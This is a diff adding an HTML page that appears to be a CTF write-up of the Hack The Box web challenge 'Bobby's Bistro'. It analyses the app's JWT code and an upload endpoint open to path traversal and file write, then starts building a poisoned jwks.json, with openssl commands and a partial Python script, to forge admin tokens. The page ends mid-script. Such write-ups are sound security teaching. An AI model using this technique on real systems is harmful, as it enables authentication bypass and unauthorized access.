@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr"
+    data-theme="dark"
+    data-layout="centered">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+  <meta name="generator" content="Hugo 0.168.0">
+  <meta name="generator-theme" content="Book Theme: https://github.com/alex-shpak/hugo-book">
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Bobby’s BistroBobby’s Bistro is a medium-level web challenge from Hack The Box.
+Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
+First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
+Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark">
+<meta name="format-detection" content="telephone=no"><meta property="og:url" content="http://localhost:1313/docs/ctf/hack-the-box/challenges-web/bobbys-bistro/">
+	<meta property="og:site_name" content="Portas">
+	<meta property="og:title" content="Bobby&#39;s Bistro">
+	<meta property="og:description" content="Bobby’s BistroBobby’s Bistro is a medium-level web challenge from Hack The Box.
+Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
+First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
+Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+		<meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
+
+
+	<meta itemprop="name" content="Bobby&#39;s Bistro">
+	<meta itemprop="description" content="Bobby’s BistroBobby’s Bistro is a medium-level web challenge from Hack The Box.
+Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
+First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
+Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.">
+	<meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+	<meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+	<meta itemprop="wordCount" content="2015">
+
+<title>Bobby&#39;s Bistro • Portas</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.png" sizes="any">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/ctf/hack-the-box/challenges-web/bobbys-bistro/">
+<link rel="stylesheet" href="/book.min.d2a63061af208ea46d4a5088bdb2c8d297df14bbb9064b630ae0b63dcb664760.css" integrity="sha256-0qYwYa8gjqRtSlCIvbLI0pffFLu5BktjCuC2PctmR2A=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.f8325650860724977ae2c0f47df384d92920fb3e3c3e882b365fdfb4c4467c57.js" integrity="sha256-&#43;DJWUIYHJJd64sD0ffOE2Skg&#43;z48PogrNl/ftMRGfFc=" crossorigin="anonymous"></script>
+  
+</head>
+
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <div class="book-container flex">
+    
+<aside class="book-menu" aria-label="Menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" role="searchbox" enterkeyhint="search"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results" aria-live="polite"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6652e0280f4a0b30fa40b02437030f68" class="toggle" checked />
+    <label for="section-6652e0280f4a0b30fa40b02437030f68" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-58e18b116dcb674821e213ec0945416f" class="toggle" checked />
+    <label for="section-58e18b116dcb674821e213ec0945416f" class="flex">
+      <a role="button" class="">
+        Hack the Box</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-494dc92d9104717a20a45ff4de94fed4" class="toggle" checked />
+    <label for="section-494dc92d9104717a20a45ff4de94fed4" class="flex">
+      <a role="button" class="">
+        Challenges (web)</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/bobbys-bistro/" class="active">
+      Bobby&#39;s Bistro</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="">
+      Breaking Grad</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="">
+      Jerrytok</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/nomad-notes/" class="">
+      Nomad Notes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="">
+      Templated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/toxic/" class="">
+      Toxic</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b358f1a871f27b6123c59716f1b3428c" class="toggle"  />
+    <label for="section-b358f1a871f27b6123c59716f1b3428c" class="flex">
+      <a role="button" class="">
+        Machines</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/blurry/" class="">
+      Blurry</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/certified/" class="">
+      Certified</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/cicada/" class="">
+      Cicada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="">
+      Monitorsthree</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c7059daadfdbaf53fa1366c3499caad7" class="toggle"  />
+    <label for="section-c7059daadfdbaf53fa1366c3499caad7" class="flex">
+      <a role="button" class="">
+        Juice Shop</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/injection/" class="">
+      Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
+      XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/readme/" class="">
+      Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
+    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
+      <a role="button" class="">
+        Offensive Security</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
+    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
+      <a role="button" class="">
+        Initial Access</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
+      Remote Template Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <header class="book-header hidden">
+      
+  <div class="flex align-center justify-between gap">
+  <input type="checkbox" class="toggle" id="menu-control" />
+  <label for="menu-control" aria-label="Menu">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#menu"></use></svg>
+  </label>
+
+  <div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+
+  
+  <input type="checkbox" class="toggle" id="toc-control" />
+  <label for="toc-control" aria-label="Table of Contents">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#toc"></use></svg>
+  </label>
+  
+</div>
+
+ 
+    </header>
+
+    <main class="book-page">
+      
+      
+  
+
+      
+  <article class="markdown book-article"><h1 id="bobbys-bistro">Bobby&rsquo;s Bistro<a class="anchor" href="#bobbys-bistro" aria-label="Link"></a></h1>
+<figure><img src="/assets/bobbys-bistro/banner.png">
+</figure>
+
+<p>Bobby&rsquo;s Bistro is a medium-level web challenge from Hack The Box.</p>
+<h2 id="setup-test-environment">Setup test environment<a class="anchor" href="#setup-test-environment" aria-label="Link"></a></h2>
+<p>For the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.</p>
+<p>First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.</p>
+<figure><img src="/assets/bobbys-bistro/docker-debug-config.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/debug-supervidor.png">
+</figure>
+
+<p>Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.</p>
+<figure><img src="/assets/bobbys-bistro/app-running.png">
+</figure>
+
+<h2 id="taint-analisys">Taint Analisys<a class="anchor" href="#taint-analisys" aria-label="Link"></a></h2>
+<p>The current objective of this fase is to understand the application by identifying its features, their functions, and the endpoints with which it communicates. Caido will be used as a proxy to record the endpoints identified during interaction with the system and to create a sitemap.</p>
+<figure><img src="/assets/bobbys-bistro/proxy-sitemap.png">
+</figure>
+
+<p>Through interaction with the system, the following functionalities were identified: account registration, login, chat with image attachments, and reading announcements; additionally, a route providing JWKS data was found at <code>static/.well-known/jwks.json</code>.</p>
+<figure><img src="/assets/bobbys-bistro/jwks-json.png">
+</figure>
+
+<p>With the source code, it is possible to discover new routes that were not accessed through manual interaction with the system, as well as to examine the implementation of already identified endpoints in search of potential vulnerabilities.</p>
+<p>Administrator routes have been identified that can only be accessed with special permissions. In this context, it is also worth examining high-risk features or those that handle critical parts of the system, as a vulnerability in such a component typically carries a more severe impact.</p>
+<p>The current phase, therefore, aims to analyze the implementation of the identified functionalities, looking for potential weaknesses and vulnerabilities.</p>
+<p>The first method analyzed concerns how the system manages login and sessions, which is handled via these method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setup_auth</span>():
+</span></span><span style="display:flex;"><span>    kid <span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>token_hex(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    private_key_jwk <span style="color:#f92672">=</span> jwk<span style="color:#f92672">.</span>JWK<span style="color:#f92672">.</span>generate(kty<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RSA&#34;</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">2048</span>, alg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RS256&#34;</span>, use<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sig&#34;</span>)
+</span></span><span style="display:flex;"><span>    private_key_jwk<span style="color:#f92672">.</span>kid <span style="color:#f92672">=</span> kid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    private_jwk_json <span style="color:#f92672">=</span> private_key_jwk<span style="color:#f92672">.</span>export_private()
+</span></span><span style="display:flex;"><span>    public_jwk_json <span style="color:#f92672">=</span> private_key_jwk<span style="color:#f92672">.</span>export_public()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(<span style="color:#e6db74">&#34;./keys&#34;</span>):
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>mkdir(<span style="color:#e6db74">&#34;keys&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./keys/private_key.json&#34;</span>, mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        json<span style="color:#f92672">.</span>dump(json<span style="color:#f92672">.</span>loads(private_jwk_json), file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    jwks <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;keys&#34;</span>: [json<span style="color:#f92672">.</span>loads(public_jwk_json)]}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./static/.well-known/jwks.json&#34;</span>, mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        json<span style="color:#f92672">.</span>dump(jwks, file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> kid, private_jwk_json, public_jwk_json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_token</span>(claims, kid):
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;kid&#34;</span>: kid, <span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>, <span style="color:#e6db74">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./keys/private_key.json&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        private_key <span style="color:#f92672">=</span> jwk<span style="color:#f92672">.</span>JWK<span style="color:#f92672">.</span>from_json(file<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    private_pem <span style="color:#f92672">=</span> private_key<span style="color:#f92672">.</span>export_to_pem(private_key<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, password<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(claims, private_pem, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RS256&#34;</span>, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_token</span>(token):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        jwks_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(<span style="color:#e6db74">&#34;static/.well-known/jwks.json&#34;</span>)
+</span></span><span style="display:flex;"><span>        jwks_client <span style="color:#f92672">=</span> PyJWKClient(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;file:///</span><span style="color:#e6db74">{</span>jwks_path<span style="color:#f92672">.</span>replace(os<span style="color:#f92672">.</span>sep, <span style="color:#e6db74">&#39;/&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        signing_key <span style="color:#f92672">=</span> jwks_client<span style="color:#f92672">.</span>get_signing_key_from_jwt(token)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(signing_key.algorithm_name)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        decoded <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(
+</span></span><span style="display:flex;"><span>            token,
+</span></span><span style="display:flex;"><span>            signing_key<span style="color:#f92672">.</span>key,
+</span></span><span style="display:flex;"><span>            algorithms<span style="color:#f92672">=</span>[signing_key<span style="color:#f92672">.</span>algorithm_name],
+</span></span><span style="display:flex;"><span>            options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;verify_signature&#34;</span>: <span style="color:#66d9ef">True</span>},
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> decoded
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span></span></span></code></pre></div><p>It can be noted that the <code>setup_auth</code> method is responsible for generating the public and private keys used to sign the JWT, as well as for writing the <code>jwks.json</code> file. As for <code>verify_token</code>, although it uses the <code>decode</code> method, which might appear insecure, it actually verifies the token&rsquo;s signature based on a private key that corresponds to the public key found in <code>jwks.json</code>.</p>
+<p>The <code>generate_token</code> method generates a token signed by the private key, containing the claims received via the parameter.</p>
+<p>After creating an account in the system and authenticating, we can log in and identify the claims present in the JWT, in this case, only <code>user_id</code>.</p>
+<figure><img src="/assets/bobbys-bistro/user_id-claim.png">
+</figure>
+
+<h2 id="file-upload--arbitrary-file-write">File Upload + Arbitrary File Write<a class="anchor" href="#file-upload--arbitrary-file-write" aria-label="Link"></a></h2>
+<p>The system includes a file upload feature, which is always a high-risk area.</p>
+<figure><img src="/assets/bobbys-bistro/chat-file-upload.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api/chat-messages&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">chat_messages</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Return username, nickname, message, timestamp</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;auth_token&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> cookie:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        dictionary <span style="color:#f92672">=</span> verify_token(cookie)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> dictionary:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(id<span style="color:#f92672">=</span>dictionary[<span style="color:#e6db74">&#34;user_id&#34;</span>])<span style="color:#f92672">.</span>first()<span style="color:#f92672">.</span>username
+</span></span><span style="display:flex;"><span>            message <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;message&#34;</span>)
+</span></span><span style="display:flex;"><span>            file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;attachment&#34;</span>)
+</span></span><span style="display:flex;"><span>            new_chat_message <span style="color:#f92672">=</span> ChatMessage(
+</span></span><span style="display:flex;"><span>                timestamp<span style="color:#f92672">=</span>str(datetime<span style="color:#f92672">.</span>now()),
+</span></span><span style="display:flex;"><span>                content<span style="color:#f92672">=</span>message,
+</span></span><span style="display:flex;"><span>                sender<span style="color:#f92672">=</span>username,
+</span></span><span style="display:flex;"><span>                attachments<span style="color:#f92672">=</span>UPLOADS_DIR <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> file<span style="color:#f92672">.</span>filename,
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>filename:
+</span></span><span style="display:flex;"><span>                file<span style="color:#f92672">.</span>save(UPLOADS_DIR <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> file<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>            db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>add(new_chat_message)
+</span></span><span style="display:flex;"><span>            db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;chat_home&#34;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;auth_token&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> cookie:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        dictionary <span style="color:#f92672">=</span> verify_token(cookie)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> dictionary:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        messages <span style="color:#f92672">=</span> ChatMessage<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>all()
+</span></span><span style="display:flex;"><span>        json_array <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> messages:
+</span></span><span style="display:flex;"><span>            json_array<span style="color:#f92672">.</span>append([i<span style="color:#f92672">.</span>timestamp, i<span style="color:#f92672">.</span>content, i<span style="color:#f92672">.</span>sender, i<span style="color:#f92672">.</span>attachments])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;success&#34;</span>: <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">&#34;messages&#34;</span>: json_array})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {}</span></span></code></pre></div><p>Focusing on the POST method for this endpoint, it can be observed that the system receives the file from the request and saves its content to <code>{UPLOADS_DIR}</code> + the filename, without any form of validation for either the content or the name. This operation performed by the system serves as a potential sink for exploitation, opening up vectors for path traversal and arbitrary file write.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>UPLOADS_DIR <span style="color:#f92672">=</span> str(BASE_DIR) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/uploads&#34;</span></span></span></code></pre></div><p>In the context of a Flask application, you cannot simply upload a Python-based webshell for the web server to interpret in the same way it might handle a PHP script. However, it is important to keep in mind the possibility of writing arbitrary files to the system&rsquo;s directories.</p>
+<h3 id="jwks-poisoning">JWKS Poisoning<a class="anchor" href="#jwks-poisoning" aria-label="Link"></a></h3>
+<p>With an arbitrary file write vector, it is possible to replace the data in <code>jwks.json</code> with a file containing parameters under our control; this allows for the forging of a JWT signature, including a token that grants administrative access to the system and entry to privileged routes.</p>
+<p>These commands can be used to generate a valid RSA public and private key pair that can be used for token signing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>openssl genrsa -out private_key.pem <span style="color:#ae81ff">2048</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>openssl rsa -in private_key.pem -pubout -out public_key.pem</span></span></code></pre></div><p>Once the keys have been created, we need to generate a <code>jwks.json</code> file that uses the public key parameters, enabling the token to be signed with the private key. This can be done using the following script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64<span style="color:#f92672">,</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives <span style="color:#f92672">import</span> serialization
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pub <span style="color:#f92672">=</span> serialization<span style="color:#f92672">.</span>load_pem_public_key(open(<span style="color:#e6db74">&#34;public_key.pem&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>n, e <span style="color:#f92672">=</span> pub<span style="color:#f92672">.</span>public_numbers()<span style="color:#f92672">.</span>n, pub<span style="color:#f92672">.</span>public_numbers()<span style="color:#f92672">.</span>e
+</span></span><span style="display:flex;"><span>
